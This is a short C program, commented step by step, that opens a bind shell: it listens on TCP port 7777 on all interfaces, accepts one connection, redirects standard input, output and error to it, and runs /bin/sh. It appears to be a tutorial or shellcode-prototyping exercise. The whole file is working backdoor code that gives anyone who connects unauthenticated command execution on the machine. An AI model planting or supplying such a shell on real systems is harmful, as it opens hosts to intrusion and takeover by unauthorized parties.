/*
 * This program will bind a command shell to a listening port
 */
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

	int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

	// Now build the struct we need for bind()
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(7777);

	// Now call bind()
	bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

	listen(listen_sock, 0);

	// create a new connection socket for accept()
	int conn_sock = accept(listen_sock, NULL, NULL); // dup2() also needs this to duplicate things

	//Now we duplicate things: stderr, stdin, stdout
	dup2(conn_sock, 0);
	dup2(conn_sock, 1);
	dup2(conn_sock, 2);

	// Execute a command shell
	execve("/bin/sh", NULL, NULL);
}


